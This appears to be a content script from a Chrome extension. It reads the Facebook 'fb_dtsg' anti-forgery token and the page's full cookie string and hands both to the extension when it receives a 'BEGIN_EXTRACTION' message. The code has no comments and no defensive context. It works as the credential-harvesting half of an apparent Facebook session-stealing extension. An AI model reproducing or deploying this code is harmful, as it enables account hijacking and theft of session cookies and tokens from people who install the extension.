function extractToken() {
    const elements = document.getElementsByName('fb_dtsg');

    if (elements.length > 0) {
        return elements[0].value
    }

    return ''
}

function extractCookie() {
    return document.cookie
}

chrome.runtime.onConnect.addListener(function (port) {
    port.onMessage.addListener(function (msg) {
        if (msg.action === "BEGIN_EXTRACTION") {
            port.postMessage({
                action: 'END_EXTRACTION',
                cookie: extractCookie(),
                token: extractToken()
            })
        }
    });
});
